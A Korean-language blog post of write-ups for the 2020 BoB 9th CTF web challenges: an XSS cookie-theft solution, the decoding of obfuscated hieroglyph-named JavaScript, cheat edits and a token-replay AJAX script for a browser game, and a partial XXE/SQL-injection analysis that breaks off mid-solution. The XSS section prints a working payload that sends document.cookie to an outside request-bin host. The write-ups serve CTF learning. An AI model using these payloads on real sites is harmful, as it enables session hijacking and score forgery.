---
layout: post
title: "2020 BoB 9th CTF Write-up"
author: "all"
comments: true
tags: [write-up, ctf]
toc: true
---

# 🖥️ WEB

## Last of cat


![/assets/bob/bob9Untitled.png](/assets/bob/bob9Untitled.png)

![/assets/bob/bob91.png](/assets/bob/bob91.png)

- `Last of Cat`  페이지에 접속하면 `Login Page`가 출력됩니다.  회원가입을 하기 위해 `Join` 버튼을 클릭한다.

![/assets/bob/bob92.png](/assets/bob/bob92.png)

- 회원가입하고 로그인을 하여 메뉴를 확인한다.

![/assets/bob/bob93.png](/assets/bob/bob93.png)

- `Cat`메뉴에서는 고양이 사진을 확인할 수 있다.

![/assets/bob/bob94.png](/assets/bob/bob94.png)

- `Bot` 에서는 `Input URL` 기능을 통해 봇에게 XSS 구문을 전송할 수 있다. 아래 `Bot Log`  테이블에서 봇이 내 URL을 확인했는지 바로 확인이 가능하다.

> 이 문제는 XSS가 발생하는 페이지를 찾아 해당 페이지를 통해 **쿠키를 탈취하는 스크립트를 작성하면 풀리는** 간단한 문제다.

![/assets/bob/bob95.png](/assets/bob/bob95.png)

- Cat Page에 접속하면 위 화면과 같은 고양이 사진과 문구가 출력된다.
- 사진과 문구를 출력하는 루틴을 살펴보면, src 파라미터를 통해 html을 읽어온다. 해당 기능을 이용하여 XSS를 발생시킬 수 있다.

```
http://bob.zairo.kr:1337/catview?**src=http://bob.zairo.kr:1337/cats/ae7d0baaa9b7ad791a6bfa53c936490e.html**
```

![/assets/bob/bob96.png](/assets/bob/bob96.png)

![/assets/bob/bob97.png](/assets/bob/bob97.png)

- `Cat` 페이지에서  `View` 버튼을 클릭할때를 Fiddler로 살펴보면 `getlink` 페이지에 `idx=숫자` 형식으로 페이지를 요청하는것을 확인할 수 있다.

![/assets/bob/bob98.png](/assets/bob/bob98.png)

- `/getlink?idx=2` 에 접속하면 위와 같이 idx와 link가 출력된다.

![/assets/bob/bob99.png](/assets/bob/bob99.png)

- getlink 페이지에 임의 값을 입력할 경우 그대로 출력해주는데 해당 페이지의 응답의 `Content-Type` 은 `application/json`이라 스크립트가 실행되지 않는다. 하지만, 특정 페이지를 로드시켜 페이지 내부에 포함하는 경우 해당 페이지를 이용하여 XSS를 발생시킬 수 있다.

![/assets/bob/bob910.png](/assets/bob/bob910.png)

```
[http://bob.zairo.kr:1337/catview?src=**http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D](http://bob.zairo.kr:1337/catview?src=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%253Cscript%253Ealert(1)%253C%252Fscript%253E)%253Cscript%253Ealert(1)%253C%252Fscript%253E**
```

- `src`에 getlink 페이지 idx 파라미터 값에 `[<script>alert(1);</script>](http://bob.zairo.kr:1337/getlink?idx=<script>alert(1)</script>)` 를 2번 URL Encoding 하여 입력하면 그림과 같이 alert 구문이 실행되는 것을 확인할 수 있다.

![/assets/bob/bob911.png](/assets/bob/bob911.png)

- `request bin`을 이용해 임의 서버로 쿠키를 전송하도록 하여 탈취하도록 한다

![/assets/bob/bob912.png](/assets/bob/bob912.png)

**Payload**

> [http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%3Cscript%3Edocument.location.href%3D%27https%3A%2F%2Fenwm946jeqwe.x.pipedream.net%2F%3Fparam%27%2Bdocument.cookie%3C%2Fscript%3E](http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%253A%252F%252Fbob.zairo.kr%253A1337%252Fgetlink%253Fidx%253D%253Cscript%253Edocument.location.href%253D%2527https%253A%252F%252Fenwm946jeqwe.x.pipedream.net%252F%253Fparam%2527%252Bdocument.cookie%253C%252Fscript%253E)

> [http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=](http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=)**&lt;script&gt;document.location.href='[https://enwm946jeqwe.x.pipedream.net/?param](https://enwm946jeqwe.x.pipedream.net/?param)'+ document.cookie&lt;/script&gt;**

- 위 구문을 통해 `catview` 페이지에서 `src` 파라미터로 값을 처리할 때 `getlink` 페이지에 접속하고 `getlink` 페이지의 `idx`에 입력 되어 있는 스크립트 구문이 실행되어 결국 쿠키를 탈취 할 수 있다.

![/assets/bob/bob913.png](/assets/bob/bob913.png)  


<br/>


<br/>


## King musae

---

![/assets/bob/bob914.png](/assets/bob/bob914.png)

[Javasciprt 난독화]
해당 문제는 Javascript 난독화이며, 간단하게 플래그가 숨겨져 있는 문제임
(본 문제는 [로얄 마카롱 앵무새](https://m.blog.naver.com/chiot_aile/221592247073)가 생각나서 만들게 되었으며,  라온에 놀러오시면 꼭 여기 마카롱집 가야됩니다.)

풀이는 어렵지 않으며, 간단하다. 별다른 안티 디버깅 및 복잡한 난독화가 아닌 단순히 플래그가 출력되지 못하도록 변수에 저장되어있는 걸 찾는 문제임

### 1. 문제 파악하기

- 문제 사이트에 접속하면 Javascript Alert로 "**find Flag**"를 출력된다.

![/assets/bob/bob915.png](/assets/bob/bob915.png)

- Chrome 개발자 도구인 소스코드 보기를 눌러 자바스크립트 코드를 확인해보면 아래와 같이 난독화된 자바스크립트 코드를 확인할 수 있다.

```jsx
𓆓 = "{}",𓅧='',𓃟='@',𓅀="test",𓅂='',𓊎=𓅂+{},𓆂 = '',𓇎=𓅂,𓅿 = 𓅂+𓅂[[]],𓆟=𓅂,++𓇎,𓆟=𓊎[++𓇎],++𓆂,++𓆂,++𓆂,𓆟+=𓊎[--𓇎],++𓆂,𓆟+=𓊎[++𓇎],𓆟+=𓆓[𓅧++],𓄧=𓊎,--𓇎,--𓇎,𓆲=𓅿[𓆂++], 𓆲+=𓅿[𓆂++],𓆲+=𓅿[𓆂++],++𓆂,𓆲+=𓅿[𓆂++],𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,++𓇎,𓅧,𓆣=𓂀[𓅂++],𓊝=𓂀[𓇎=𓅂],𓆂--,--𓆂,𓆌=𓊝+𓃟+𓊎[𓇎]+𓅿[--𓆂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢],𓆌+=𓆓[𓅧],𓆓[𓆡=𓆟+𓄧+𓆌],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[𓇎]+𓂀[𓏢]+𓊝+𓆣+"('"+𓆲+" Flag')")``
```

- 우선 난독화된 자바스크립트를 파악하기 전 "alert" 문자열 없이 alert가 실행된 건 알 수 있으며,  해당 코드가 어떻게 실행되었는지 "**`**" 벡터를 제거하여 난독화된 자바스크립트가 실행되지 않도록 chrome console에 넣어보면 아래와 같이 코드가 구현되어 있는 걸 알 수 있다.

![/assets/bob/bob916.png](/assets/bob/bob916.png)

- 하지만 변수에 저장된 Flag는 알 수 없었지만 난독화된 코드를 통하여 alert가 실행된건 알 수 있다.

보다 쉬운 예제는 "[Martin Kleppe](https://twitter.com/aemkei/status/1262872762621837314)"가 작성한 코드를 보면 더 쉽게 알 수 있다.

```jsx
const 𓀀 = '𓅂';
function 𓆣(𓂀){ alert(𓂀); }
𓆣(𓀀);
```

[Martin Kleppe의 special characters]

위 코드를 브라우저에서 실행되면 새가 출력되는걸 볼 수 있으며, 위 코드를 하나씩 설명하면

먼저 "**𓀀**" 변수에 싱글 쿼터로 문자열로 만들어 '**𓅂**' 새를 저장한다.

그리고 사용자 정의 함수를 만드는 과정에서 함수 이름 대신 "𓆣" 장수 풍댕이로 선언하고 인자명 대신 "𓂀" 나뭇잎을 선언하고 내부 로직은 alert를 통하여 전달된 인자(나뭇잎)를 통하여 출력되는 로직이다.

그러므로 최종적으로 장수 풍댕이(함수)를 새가 저장된 "**𓀀"**변수를 인자로 전달하여 결국엔 새가 출력되는 로직이다. ****여기까지 이해가 되었다면 아래 예제에서 난독화에 대해 좀더 알아보도록 하자.

### 2. 로직 파악하기

```jsx
𓅂=''             //    ""
𓂀=!𓅂+𓅂        //    "true"
𓁄=!𓂀+𓅂         //    "false"
𓊎=𓅂+{}          //    "[object Object]"

𓆣=𓂀[𓅂++]        //   "r" (𓅂 = 2)
𓊝=𓂀[𓇎=𓅂]       //   "u" (𓇎  = 2)
𓏢=++𓇎+𓅂          //    5  (𓇎 = 3), (𓇎3 + 𓅂2)
𓆗=𓊎[𓇎+𓏢]         //    "O"

𓂀                 //   "true"
𓆗+=𓊎[𓅂]         //   "co"
(𓂀.𓁄+𓊎)[𓅂]    //    "n"
𓁄[𓏢]              //   "s"
𓆣                 //   "t"
𓊝                 //   "r"
𓊎[𓅂]            //   "o"
𓊝                //    "r"
𓆗                 //   "constructor"

𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+
𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗]
//   ƒ Function() { [native code] }

𓁄[𓅂]             //   "a"
𓁄[𓇎]              //   "l"
𓂀[𓏢]              //   "e"
𓊝                 //   "r"
𓆣                  //   "t"

𓁄[𓅂]+𓁄[𓇎]+𓂀[𓏢]+𓊝+𓆣 // "alert"

𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+
𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[𓇎]+𓂀[𓏢]+𓊝+𓆣+"('"+𓆲+" Flag')")
// ƒ anonymous(
// ) {
// alert('find Flag')
// }

𓂀[𓆗][𓆗]
// ƒ Function() { [native code] }

𓂀[𓆗][𓆗](𓁄[𓅂]+𓁄[𓇎]+𓂀[𓏢]+𓊝+𓆣+"('DongDongE')")``
//ƒ anonymous(
//) {
//alert('DongDongE')
//}
```

- 위와 같이 alert를 출력하기 위해 각종 문자열 조합으로 Function을 만들고 문자를 조합 한다.

위 코드가 그래도 어렵다면 아래 예제에서 간단하게 풀어서 알아보도록 하자.

```jsx
𓁄[𓅂]             //   "a"       "false" 문자열의 2번째 "a"
𓁄[𓇎]              //   "l"       "false" 문자열의 3번째 "ㅣ"
𓂀[𓏢]              //   "e"       "true"  문자열의 4번째 "e"
𓊝                 //   "r"       "true"  문자열의 2번째 "r"
𓆣                  //   "t"       "true"  문자열의 1번째 "t"
```

위 코드와 같이 "false"와 "true"의 문자열을 하나씩 추출하여 조합하면 "alert"가 되어 alert가 문자열에서 function으로 실행되도록 하는 원리이다.

그러면 위 플래그를 얻기 위해 하나씩 변수를 출력해보면 플래그가 출력된다.

```jsx
𓆡=𓆟+𓄧+𓆌
"bob{[object Object]r@on}"
```

- [x]  Flag is bob{[object Object]r@on}

- 간혹 플래그값이 자바스크립트의 **"object Object**"가 있는걸 의문 들 수 있지만 하나의 문자를 추출후 조합하기 위해 3-5줄 라인이 더 추가된다. 예를 들어 플래그를 "bob[R@onWhiteHat_1235]" 이런식으로 출력한다고 하면 17글자 이므로 17 * 3 = 51라인이 더 추가되므로 난독화을 풀어나가는 과정에서 난이도가 상승되고 복잡하므로 간단한 플래그를 넣어 난이도를 낮추게 됨.


<br/>


<br/>



## Fun Fun Game

---

![/assets/bob/bob917.png](/assets/bob/bob917.png)

[Javasciprt 조작]
문제 사이트에 접속 시 아래와 같은 페이지가 출력되며 게임이 진행되며 게임 플레이 방법은 "**BOB**" 라고 쓰여 있는 우주괴물을 다 제거되어야 Flag가 나오는 문제임.
(본 문제는 [Raon Secure Fun Zone](https://www.raoncorp.com/ko/recruit/raonlife)를 모티브로 제작됨)

풀이는 대략 2가지로 생각할 수 있다.
첫 번째는 직접 게임 플레이를 진행 후 전부 제거하여 Flag를 얻거나 (Physical),
두 번째 방법으로는 자바스크립트 로직을 우회하여 게임핵(무적, 스피드)을 제작하여 게임을 진행하거나 또는 게임 진행할 필요 없이 Flag를 얻을 수 있다.

![/assets/bob/game_1.gif](/assets/bob/game_1.gif)

### **1. 문제 로직 파악하기**

- 문제를 파악하기 위해 게임 한판을 진행한다.

![/assets/bob/bob918.png](/assets/bob/bob918.png)

- 60 Point까지 쌓고 "**Game Over**"되어 "**Restart**" 버튼을 누른 상태의  패킷 History 이다.

- 아래 패킷을 통하여 한번 살펴보도록 하자.

```prolog
POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 142
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&token=start
```

[25라인 패킷 - Request]

```verilog
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:44:43 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 32
Connection: close
Content-Type: text/html; charset=UTF-8

d2e94e4635c240c14e209fab2fa719e7
```

[25라인 패킷 - Response]

```verilog
POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 169
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&token=d2e94e4635c240c14e209fab2fa719e7
```

[26라인 패킷 - Request]

```verilog
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:44:45 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 32
Connection: close
Content-Type: text/html; charset=UTF-8

7a115a19ee939868ff2222f8fd765606
```

[26라인 패킷 - Rsponse]

- 26 라인 ~ 28 라인까지 과정이 같으므로 생략

```verilog
POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 11
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

check=start
```

[마지막 29라인 - Reqeust]

```verilog
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:46:52 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

[마지막 29라인 - Response]

- 위와 같이 규칙성을 찾아본다면, 처음 게임 플레이하여 15Kill을 하였을 때 "**kills=15&token=start**" POST 값에 Token을 생략하여 보내지만, 응답으로 "**d2e94e4635c240c14e209fab2fa719e7**" 토큰을 가져오게 됩니다. 두 번째 15Kill 부터 받았던 토큰을 다시 전송하는 규칙을 찾을 수 있다.
- 마지막으로 게임이 종료되었을 때는 별다른 패킷을 전송하지 않지만 재시작(Restart) 버튼을 클릭하였을 때 "**check=start**" 패킷을 확인할 수 있다.

- 하지만 "킬수" 조작 및 "토큰"값 조작이 되어 있으면 탐지가 되어 문제를 풀 수 없는 Protect가 설정되어 있다.

![/assets/bob/bob919.png](/assets/bob/bob919.png)

```prolog
POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 142
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=20
```

[kill 수 조작된 패킷 - Request]

```prolog
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 02:22:26 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 146
Connection: close
Content-Type: text/html; charset=UTF-8

alert('비정상 행위 탐지!! Kills 수가 조작되었습니다. 부정행위로 점수를 초기화 되었습니다.');location.reload(true);
```

[Kill 수 조작된 패킷 - Response]

- 해당 킬 수는 일정하게 15 Kill를 조작하여 초과할 경우 자동으로 부정행위로 간주되어 그동안 쌓아온 킬을 초기화된다.

- 그러면 반대로 토큰값이 조작되었을 때 아래와 같이 토큰 조작 경고창이 출력된다.

```prolog
POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 169
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&token=79d7ed5a7bfe66da42d96a7ef433ff4c
```

[Token 조작 패킷 - Request]

- 토큰값 조작

```prolog
HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 02:26:12 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 161
Connection: close
Content-Type: text/html; charset=UTF-8

alert('비정상 행위 탐지!! 토큰값이 일치하지 않습니다. 비정상 행위로 점수가 합쳐지지 않습니다. 새로고침 해주십시오');
```

[Token 조작 패킷 - Response]

조작된 토큰값 행위는 위와 같이 탐지되어 더이상 Kill수가 쌓이지 않는다.

### 2**. Hint & Debug 정보 찾기**

- 이제 로직에 대해 파악하였으니, 문제 풀이를 위한 힌트 정보를 찾아보도록 하자.

![/assets/bob/bob920.png](/assets/bob/bob920.png)

- Chrome Console을 확인해보면 위와 같이 소수점 값을 확인할 수 있다. (출력된 값의 개수는 사용자마다 다를 수 있음.) 해당 값에 대한 정보를 파악하기 위해 "**bob_game.js**" 파일의 492번째 줄 코드를 확인해보도록 하자.

```jsx
function initGameStart() {
            screen.canvas.width = 1300;
            screen.canvas.height = 900;
            gameSize = {
              width: 1300,
              height: 900
            };
            
            invaderMultiplier = 3;
            initialOffsetInvader = 420;

          invaderAttackRate = 0.98 + "" + Math.floor(Math.random() * 10);
          console.log(invaderAttackRate);
          invaderSpeed = 30;
          spawnDelayCounter = invaderSpawnDelay;
          
          game = new Game();
        }
```

- 492번째 코드는 "**console.log(invaderAttackRate);**" 이며 해당 값은 변수명에서 알 수 있듯, 게임 공격자(외계인)의 공격 속도이며, 해당 값을 조작하여 어떤 반응이 보이는지 확인해 보자.

![/assets/bob/Not_Attack.gif](/assets/bob/Not_Attack.gif)

- "**invaderAttackRate = 9999;**" 방식으로 공격자(외계인)이 공격을 하지 않는 행위로 로직을 구현할 수 있으며 아래와 같이 반대로 값을 낮춘다면 공격자는 더 빠르고 많이 공격을 하게 된다.

![/assets/bob/Attack.gif](/assets/bob/Attack.gif)

- "**invaderAttackRate = 0.001;" 이건 답이 없다....**

위와 같이 힌트를 통하여 Javasciprt Debug를 통하여 로직을 변경할 수 있는 걸 확인할 수 있다. 하지만 공격 속도로 변경하는 것 보단 "**스피드**" + "**무적**" + "**공격수 무한**"를 걸어 문제 풀거나 자바스크립트 로직을 통하여 게임을 진행하지 않고 풀이를 진행할 수 있다.

### 3**. 스피드 + 무적 + 공격 속도 핵 만들기**

- 이제 로직에 대해 파악하였으니, 문제 풀이를 위한 힌트 정보를 찾아보도록 하자.

```prolog
var Player = function() {
          this.active = true;
          this.size = {
            width: 0.1,  //232번째 16 -> 0.1 으로 수정 (게임 플레이어 안보이게 설정)
            height: 0.1  //233번째 8  -> 0.1 으로 수정 (게임 플레이어 안보이게 설정)
          };

// 259번째 라인
if (this.keyboarder.isDown(this.keyboarder.KEYS.LEFT) && this.coordinates.x > 0) this.coordinates.x -= 30; // 2 -> 30으로 수정 (스피드 핵)

// 260번째 라인
else if (this.keyboarder.isDown(this.keyboarder.KEYS.RIGHT) && this.coordinates.x < gameSize.width - this.size.width) this.coordinates.x += 30; // 2 -> 30으로 수정 (스피드 핵)

if (this.keyboarder.isDown(this.keyboarder.KEYS.Space)) {
            // 263번째  this.shooterHeat += 1; 주석 처리 (플레이어 공격 속도 무제한)

destroy: function() {
            //291번째 this.active = false;  주석 처리 (플레이어 무적)
            //292번째 game.lost = true;     주석 처리 (플레이어 무적 - 게임 종료 안되게)
          }

var Projectile = function(coordinates, velocity) {
          this.active = true;
          this.coordinates = coordinates;
          this.size = {
            width: 300, //303번째 줄  3 -> 300으로 변경 수정 (플레이어 공격 크기 변경)
            height: 3
          };
          this.velocity = velocity;
        };

//491번째 invaderAttackRate = 0.98 + "" + Math.floor(Math.random() * 10); 주석 처리 (공격자 외계인이 공격 못하도록 수정)

```

- 위와 같이 Javascript를 변경하여 플레이를 할 경우 아래와 같이 실행된다.

![/assets/bob/clear.gif](/assets/bob/clear.gif)

- 게임핵 완성하여 플래그 획득!
- 물론 위 와 같이 Javascript 게임 핵을 만들어 플레이하여 플래그를 획득할 수 있지만, 게임 로직을 파악하여 Javascript를 코딩할 수 있다면 플레이 대신 반복문으로 아래와 같이 플래그를 획득할 수 있다.

### 4**. Javascript Coding를 통하여 플래그 획득하기**

- 이번에는 게임 핵으로 문제풀이 대신 Javascript 코딩을 통하여 플래그를 획득 하자.

```jsx
$.ajaxSetup({async: false});  

var url = "check.php";
var data = {kills: 15, token: "start"};
token = 1;

$.post(url, data, function(response) {
    token = response;
    
});

for(var i = 0;  i <= 35;  i++) {
    var data = {kills: 15, token: token};

    
    $.post(url, data, function(response) {
        token = response;
    });
};

var data = {check: "clear"};
$.post(url, data, function(response) {
    eval(response);
});
```

- Game 로직을 파악했다면 위와 같이 Javascript Code의 Ajax를 통하여 문제를 풀 수 있다.
로직의 원리는 Kills수가 15를 초과할 수 없으므로, 먼저 Token값에 "**start**"를 보내어 두 번째 이후부터 응답되어 온 토큰을 가지고 다시 35번 반복을 통하여 토큰을 전송하고, 마지막으로 공격자(외계인)를 전부 물리쳤다는 "**check=clear**" 값을 전송하여 플래그를 획득하는 로직이다.

![/assets/bob/clears.gif](/assets/bob/clears.gif)

- [x]  Flag is bob{b0b_!s_fun_g@me_r3tr0}

- 대회 끝나고 Access.log를 확인해본 결과... "**105961**" Line이 쌓였네요. 3일 만에 10만 줄이 쌓인 걸 보니 오기로 게임 플레이어 하여 플래그를 획득한 분도 계실 거라 예상됩니다... (존경스럽습니다...)


<br/>


<br/>



## babyweb

---

![/assets/bob/bob921.png](/assets/bob/bob921.png)

문제 설명에 /readFlag 라고 되어 있으므로 RCE를 해야하는 문제이다.

문제 페이지에 접속하면 XML 사용하는 페이지가 나온다.

![/assets/bob/bob922.png](/assets/bob/bob922.png)

XXE 공격을 통해 소스 페이지를 하나하나씩 본다.

먼저 "join.php"를 보면 htmlentities를 통해 무언가를 막으려하는 것을 볼 수 있다.

```php
<?php
	$id = mysqli_real_escape_string($dbc, htmlentities($_POST['id'], ENT_QUOTES, "UTF-8"));
	$pw = hash('sha256', $_POST['pw']);
	$nick = mysqli_real_escape_string($dbc, htmlentities($_POST['nick'], ENT_QUOTES, "UTF-8"));

	$query = "INSERT INTO users VALUES (NULL,'{$id}', '{$pw}', '{$nick}', '');";

	$result = mysqli_query($dbc, $query);

	if($result)
		echo '<script>location.href="./";</script>';
	else
		echo '<script>alert("Error"); history.go(-1);</script>';

```

그리고 login.php를 보면 $_SESSION 변수에 로그인한 아이디와 닉네임을 넣는다.

```php
<?php
	$id = mysqli_real_escape_string($dbc, $_POST['id']);
	$pw = hash('sha256', $_POST['pw']);

	$query = "SELECT * FROM users WHERE userid='{$id}' AND password='{$pw}'";

	$result = mysqli_query($dbc, $query);
	$row = mysqli_fetch_array($result);

	if($id===$row['userid'] && $pw===$row['password']){

		$_SESSION['nickname'] = $row['nickname'];
		$_SESSION['userid'] = $row['userid'];
		echo '<script>location.href="./";</script>';
	}else
		echo '<script>alert("Error"); history.go(-1);</script>';

```

RCE를 위해서는 LFI 취약점이 필요하다. LFI를 하기 위해선 파일 업로드 기능을 이용하거나 파일에 원하는 것을 쓸 수 있는 기능이 있으면 된다.

하지만 "join.php"에서 htmlentities를 이용해 세션 파일에 php 태그를 사용할 수 없도록 제한하였다.

그 다음 "getxmldata.php"를 보면 mysqli_real_escape_string를 통해서 SQLI를 막은 것 처럼 보이지만 실제로는 막히지 않았다.

```php
<?php

function xss_filter($data) 
{ 
    if(empty($data)) 
        return $data; 
         
    if(is_array($data)) 
    { 
        foreach($data as $key => $value) 
        { 
            $data[$key] = xss_filter($value); 
        } 
         
        return $data; 
    } 
     
    $data = str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','&amp;gt;'), $data); 
    $data = preg_replace('/(&#*\\w+)[\\x00-\\x20]+;/', '$1;', $data); 
    $data = preg_replace('/(&#x*[0-9A-F]+);*/i', '$1;', $data); 

    if (function_exists("html_entity_decode"))
    {
        $data = html_entity_decode($data); 
    }
    else
    {
        $trans_tbl = get_html_translation_table(HTML_ENTITIES);
        $trans_tbl = array_flip($trans_tbl);
        $data = strtr($data, $trans_tbl);
    }

    $data = preg_replace('#(<[^>]+?[\\x00-\\x20"\\'])(?:on|xmlns)[^>]*+>#i', '$1>', $data); 
    $data = preg_replace('#([a-z]*)[\\x00-\\x20]*=[\\x00-\\x20]*([`\\'"]*)[\\x00-\\x20]*j[\\x00-\\x20]*a[\\x00-\\x20]*v[\\x00-\\x20]*a[\\x00-\\x20]*s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:#i', '$1=$2nojavascript...', $data); 
    $data = preg_replace('#([a-z]*)[\\x00-\\x20]*=([\\'"]*)[\\x00-\\x20]*v[\\x00-\\x20]*b[\\x00-\\x20]*s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:#i', '$1=$2novbscript...', $data); 
    $data = preg_replace('#([a-z]*)[\\x00-\\x20]*=([\\'"]*)[\\x00-\\x20]*-moz-binding[\\x00-\\x20]*:#', '$1=$2nomozbinding...', $data); 
    $data = preg_replace('#(<[^>]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\'"]*.*?expression[\\x00-\\x20]*\\([^>]*+>#i', '$1>', $data); 
    $data = preg_replace('#(<[^>]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\'"]*.*?behaviour[\\x00-\\x20]*\\([^>]*+>#i', '$1>', $data); 
    $data = preg_replace('#(<[^>]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\'"]*.*?s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:*[^>]*+>#i', '$1>', $data); 
    $data = preg_replace('#</*\\w+:\\w[^>]*+>#i', '', $data); 

    do 
    { 
        $old_data = $data; 
        $data = preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i', '', $data); 
    } 
    while ($old_data !== $data); 
     
    return $data; 
}

.......

$xmldata = xss_filter(mysqli_real_escape_string($dbc, $data));
$query = 'update users set xmldata="'.$xmldata.'" where userid="'.mysqli_real_escape_string($dbc, $_SESSION['userid']).'";';
$res = mysqli_query($dbc, $query);

```

